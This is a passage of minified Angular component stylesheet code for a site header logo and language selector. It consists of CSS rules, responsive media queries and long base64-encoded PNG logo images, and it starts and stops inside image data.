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) 0 0/contain no-repeat
            }

            .watford-clear[_ngcontent-c2] {
                display: none
            }

            .language_V1[_ngcontent-c2] {
                margin-right: 10px
            }
        }

        @media only screen and (max-width:639px) and (-webkit-min-device-pixel-ratio:2) and (-webkit-min-device-pixel-ratio:2),
        only screen and (max-width:639px) and (-webkit-min-device-pixel-ratio:2) and (min-resolution:192dpi) {
            .exeter[_ngcontent-c2] {
                width: 95px;
                height: 31px;
                margin-top: 4px;
                margin-left: 22px;
                float: left;
                background: url(logo_positivoB-big.da4763d50878fd2f4dda.png) 0 0/contain no-repeat
            }
        }

        @media only screen and (max-width:479px) and (min-width:320px) {
            .language_V1[_ngcontent-c2] {
                margin-right: 0
            }
        }

        .bots [_nghost-c2] .hideContactUs[_ngcontent-c2] {
            display: none
        }

        .bots [_nghost-c2] .hideLanguage[_ngcontent-c2] {
            display: none
        }

        .watford[_ngcontent-c2] {
            border-bottom: inherit
        }

        .exeter[_ngcontent-c2] {
            display: block;
            width: 222px;
            height: 80px;
            margin: 0 auto;
            cursor: pointer;
            background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAABQCAYAAAB23csfAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA2RpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDozNTMxOTI3NkY1MDZFNjExOEU0N0E3NzY1ODk2M0U5QyIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDo1NTk5MTFCOTNFMTIxMUU2ODE2NUFEN0UxN0JGODVEQiIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDo1NTk5MTFCODNFMTIxMUU2ODE2NUFEN0UxN0JGODVEQiIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M1IFdpbmRvd3MiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo0RkQ4MTQ5RTQxMzlFNjExQjQzQkI0NzQwNzQ5OTE3MyIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDozNTMxOTI3NkY1MDZFNjExOEU0N0E3NzY1ODk2M0U5QyIvPiA8L3JkZjpEZXNjcmlwdGlv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) top left no-repeat
        }

        @media (-webkit-min-device-pixel-ratio:2),
        (min-resolution:192dpi) {
            .exeter[_ngcontent-c2] {
                background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAbwAAACgCAYAAAB309mLAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA2RpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDozNTMxOTI3NkY1MDZFNjExOEU0N0E3NzY1ODk2M0U5QyIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDo0RkJFQjk5MjNFMTIxMUU2QjQ4MEEwQTM1QTEyNjI0OSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDo0RkJFQjk5MTNFMTIxMUU2QjQ4MEEwQTM1QTEyNjI0OSIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M1IFdpbmRvd3MiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo1MEQ4MTQ5RTQxMzlFNjExQjQzQkI0NzQwNzQ5OTE3MyIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDozNTMxOTI3NkY1MDZFNjExOEU0N0E3NzY1ODk2M0U5QyIvPiA8L3JkZjpEZXNjcmlwdGlv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